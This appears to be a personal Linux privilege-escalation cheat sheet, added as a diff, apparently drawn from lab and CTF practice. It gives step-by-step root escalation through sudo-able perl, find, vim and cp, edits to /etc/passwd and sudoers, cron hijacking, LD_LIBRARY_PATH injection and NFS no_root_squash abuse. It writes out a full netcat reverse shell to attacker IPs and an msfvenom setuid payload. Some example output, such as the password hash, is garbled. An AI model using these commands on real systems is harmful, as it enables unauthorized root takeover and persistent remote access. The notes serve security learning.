@@ -1,0 +1,244 @@
+Linux Privilege Escalation:
+sudo -l
+
+Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+
+sudo -l
+This cmd will show the files that can be executed only by root user.
+Output:
+(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+nopasswd means we can run this as a root user without password.
+
+
+Opening the backup.pl file
+cat /home/itguy/backup.pl
+Output:
+#!/usr/bin/perl
+system("sh", "/etc/copy.sh");
+
+cat /etc/copy.sh
+Output:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+So copy.sh is a reverse shell already existing in the folder.
+We are going to change the ip and port in the reverse shell by modifying the file.
+
+nano /etc/copy.sh
+This cmd throws an error and says we don;t have permission.
+
+Now we are going to use another way.
+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.29.210 4444 >/tmp/f" > /etc/copy.sh
+This command works. And the file is modified.
+
+nc -nvlp 4444
+Run this in your machine.
+
+Now execute the file in target machine.
+sudo /usr/bin/perl /home/itguy/backup.pl
+Now you got the revrse shell with root access in netcat
+---------------------------------------------------------------------------------------------------
+
+
+Editing /etc/passwd :
+You can use this method only if you have access to /etc/passwd file
+We are going to modify /etc/passwd file to gain root user.
+
+openssl passwd -1 -salt user password 
+The above cmd is the syntax.
+openssl passwd -1 -salt wayne wayne
+Output:
+$dsafi4in.as45/
+The output will be some hash value.
+
+Now edit /etc/passwd file and add the below line
+wayne:$dsafi4in.as45/:0:0:,,,:/home/wayne:/bin/bash
+Check below Syntax:
+user:hash:usernum:grpnum:description:homedirectory:execdir
+0 is the root number, so we gave 0 in both user and group.
+we are giving ,,, as description
+------------------------------------------------------------------------------------------------
+
+
+Editing sudoers files:
+You can use this method only if you have access to /etc/sudoers file
+
+Open the file, there is a line like this.
+#User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+Now add a new line below the root.
+temp    ALL=(ALL:ALL) ALL
+Now save the file.
+
+Now in terminal give this cmd.
+su temp
+Ignore the password and press enter. Now got root access.!!!
+------------------------------------------------------------------------------------------------
+
+
+Find binary:
+sudo -l
+User temp may run following commands on kali:
+     (root) NOPASSWD: /usr/bin/find
+nopasswd means we can run this binary as a root user without password.
+
+/usr/bin/find <filename> -exec <command>
+/usr/bin/find error -exec whoami \;
+Means if you find this file, then execute this command.
+
+sudo /usr/bin/find sample -exec bash -i \;
+\;  means to end this line.
+This cmd will give you root shell.
+You can also replace the command with bash reverse shell code from pentestmonkey.com
+----------------------------------------------------------------------------------------------
+
+
+Vim binary:
+sudo -l
+User temp may run following commands on kali:
+     (root) NOPASSWD: /usr/bin/vim
+nopasswd means we can run this binary as a root user without password.
+
+Open vim by using this cmd "sudo vim":
+And press "Shift + ;" and type.
+:set shell=/bin/bash
+Now again type "Shift + ;" and type
+:shell
+
+Now you got root shell.
+If you want persistence, then you can edit /etc/sudoers file and add a user as root.
+------------------------------------------------------------------------------------------------
+
+
+cp binary:
+sudo -l
+User temp may run following commands on kali:
+     (root) NOPASSWD: /usr/bin/cp
+nopasswd means we can run this binary as a root user without password.
+
+cp /etc/sudoers backup
+
+We are copying the sudoers file and saving the contents to a new file.
+But to read or edit the file we need root permission.
+So we are going to copy this file and send it to our attacker machine, because we have root access in our attacker machine so we can read the contents.
+
+cp backup /home/kali/Desktop/backup
+Now goto attacker machine and edit the contents of the file.
+And send it to the target machine.
+
+sudo cp ./sudoers2 /etc/sudoers
+Here we are replacing all contents in /etc/sudoers file with our sudoers2 file.
+
+Now we got the root shell.!!!
+------------------------------------------------------------------------------------------------
+
+
+Cron Jobs:
+If any cron jobs is running as root, then we can modify and get root shell.
+
+cat /etc/crontab
+Output:
+** *** root cd /var/www/ && sudo bash .mysecretcronjob.sh
+
+So there is a cron job running every minute executing the bash file.
+We are going to modify the bash file.
+
+nano .mysecretcronjob.sh 
+Now add the bash reverse shell command inside the file and save it.
+Then that bash file will get executed every minute. 
+Now start netcat listener in attacker machine.
+Now you got root shell.
+----------------------------------------------------------------------------------------------
+
+
+Kernel Exploits:
+uname -a 
+Use this cmd to find the kernel version.
+
+Now use searchsploit to find exploit for the kernel version.
+searchsploit linux kernel 5.1
+
+Or you use this tool.
+https://github.com/mzet-/linux-exploit-suggester.git
+Just run this tool in the machine, it will tell you if there are any possible kernel exploits.
+
+linux-exploit-suggester.sh -u "Linux kali 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07) x86_64 GNU/Linux"
+--------------------------------------------------------------------------------------------------
+
+
+LinPEAS:
+It is privilege escalation tool for linux.
+Run linpeas_base.sh in the target machine.
+This will give all possible priv esc methods on that machine.
+
+Linux Smart Enumeration:
+It is a privilege escalation tool for linux.
+This tool is like LinPEAS but this gives the info in more useful format.
+run lse.sh in the target machine.
+-------------------------------------------------------------------------------------------------
+
+
+Readable SSH key:
+With this misconfiguration we can read the ssh private key of the user, which we can later use it to login to that user without pass.
+
+sshkey.private is the private key file in our scenario.
+
+ssh -i sshkey.private bandit14@localhost
+The above cmd is used to shh to the user account using their private key.
+bandit14 is the 2nd target username.
+--------------------------------------------------------------------------------------------------
+
+
+LXD Containers:
+LXD is a system container and virtual machine manager.
+It offers a simple CLI and REST API to manage local and remote interfaces.
+
+
+LD_LIBRARY_PATH Injection:
+library_path.c this is the privesc file.
+This file will unset the "LD_LIBRARY_PATH" variable and set the uid as 0 which is the root.
+
+gcc -fPIC -shared -o /tmp/libdl.so.2 library_path.c
+We have successfully compiled.
+
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
+Now you got root shell.
+--------------------------------------------------------------------------------------------
+
+cat ~/.*history
+This cmd will show all history.
+Sometimes username and passwords or any sensitive info can be found in history.
+
+
+------------------------------------------------------------------------------------------
+Check the NFS share configuration:
+cat /etc/exports
+If specific directory has no_root_squash, then you can try privilege escalation.
+
+Switch to root user in attacker machine.
+mkdir /tmp/nfs
+mount -o rw,vers= <victim-ip>:/tmp /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+
+Now goto victim machine and run this.
+/tmp/shell.elf
+
+You will get a root shell.
+----------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
